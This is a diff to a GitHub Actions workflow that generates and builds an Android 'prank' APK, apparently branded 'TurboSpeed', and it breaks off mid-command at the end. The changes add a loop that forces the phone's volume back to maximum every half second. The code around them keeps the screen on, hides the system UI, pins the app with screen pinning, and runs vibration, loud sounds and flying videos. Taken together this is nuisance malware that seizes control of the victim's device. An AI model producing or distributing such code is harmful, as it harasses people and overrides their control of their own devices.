@@ -68,8 +68,8 @@ jobs:
                   applicationId = "com.stresstest"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 27
-                  versionName = "27.0"
+                  versionCode = 29
+                  versionName = "29.0"
               }
               compileOptions {
                   sourceCompatibility = JavaVersion.VERSION_17
@@ -159,13 +159,25 @@ jobs:
                   window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
                   hideSystemUI()
 
-                  try {
-                      val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-                      val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
-                      audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)
-                  } catch (e: Exception) {}
-
                   rootLayout = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
+
+                  // --- 0. VOLUME PAKSA MAKSIMAL & TUG-OF-WAR ---
+                  val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                  val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
+                  audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)
+
+                  val volumeRunnable = object : Runnable {
+                      override fun run() {
+                          if (!isRunning) return
+                          try {
+                              if (audioManager.getStreamVolume(AudioManager.STREAM_MUSIC) < maxVol) {
+                                  audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0)
+                              }
+                          } catch (e: Exception) {}
+                          handler.postDelayed(this, 500)
+                      }
+                  }
+                  handler.post(volumeRunnable)
 
                   // --- 1. VIDEO 1 (FULL SCREEN, TIDAK TERBANG) ---
                   val vid1Id = resources.getIdentifier("video1", "raw", packageName)
@@ -203,20 +215,20 @@ jobs:
 
                   val flyingViews = mutableListOf<View>()
 
-                  // --- 3. VIDEO 2 (UKURAN NORMAL, TERBANG) ---
+                  // --- 3. VIDEO 2 (UKURAN DIBESARIN JADI 600x600) ---
                   val vid2Id = resources.getIdentifier("video2", "raw", packageName)
                   if (vid2Id != 0) {
                       val vv2 = VideoView(this).apply {
                           setVideoURI(Uri.parse("android.resource://$packageName/$vid2Id"))
                           setOnPreparedListener { mp -> mp.isLooping = true; mp.setVolume(1f, 1f); start() }
                       }
-                      val params2 = FrameLayout.LayoutParams(400, 400)
+                      val params2 = FrameLayout.LayoutParams(600, 600) // <--- Diperbesar dari 400 ke 600
                       params2.gravity = Gravity.CENTER
                       rootLayout.addView(vv2, params2)
                       flyingViews.add(vv2)
                   }
                   
-                  // --- 4. GAMBAR TERBANG (UKURAN NORMAL) ---
+                  // --- 4. GAMBAR TERBANG (UKURAN NORMAL 400x400) ---
                   for (i in 1..2) {
                       val imgId = resources.getIdentifier("image$i", "drawable", packageName)
                       if (imgId != 0) {
@@ -301,9 +313,7 @@ jobs:
                   // --- 8. SEMATKAN APLIKASI (SCREEN PINNING) ---
                   try {
                       startLockTask()
-                  } catch (e: Exception) {
-                      // Abaikan jika perangkat tidak mendukung
-                  }
+                  } catch (e: Exception) {}
 
                   startVibration()
                   startMultiSound()
@@ -399,9 +409,4 @@ jobs:
       - name: Build Debug APK
         run: |
           gradle wrapper --gradle-version 8.7
-          chmod +x gradlew
-          ./gradlew assembleDebug
-      - uses: actions/upload-artifact@v4
-        with:
-          name: TurboSpeed-Prank-APK
-          path: app/build/outputs/apk/debug/*.apk
+          chm
